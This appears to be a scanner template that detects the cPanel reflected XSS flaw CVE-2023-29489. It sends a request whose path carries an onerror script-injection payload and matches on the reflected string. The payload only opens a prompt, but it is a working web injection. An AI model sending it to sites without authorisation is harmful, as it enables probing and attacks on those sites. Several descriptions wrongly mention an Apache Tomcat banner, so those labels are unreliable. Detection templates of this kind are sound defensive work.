info:
  author: drfabiocastro
  classification:
    country: any
    tags:
    - cpanel
    - xss
    - detection
  description: cPanel CVE-2023-29489
  id: CVE-2023-29489
  matcher-condition: or
  matchers:
  - pattern: <img src=x onerror="prompt(document.domain)">aaaaaaaaaaaa
  - description: Apache Tomcat web server banner found in response headers
    pattern: 'Invalid webcall ID:'
    type: body
  name: Cpanel xss - Detect
  reference:
  - https://blog.assetnote.io/2023/04/26/xss-million-websites-cpanel/
  requests:
    condition: or
    description: Attempt to retrieve Apache Tomcat web server banner
    method: GET
    path:
    - /cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaa
  response:
  - description: Successful response status
    status:
    - 400
  severity: Low
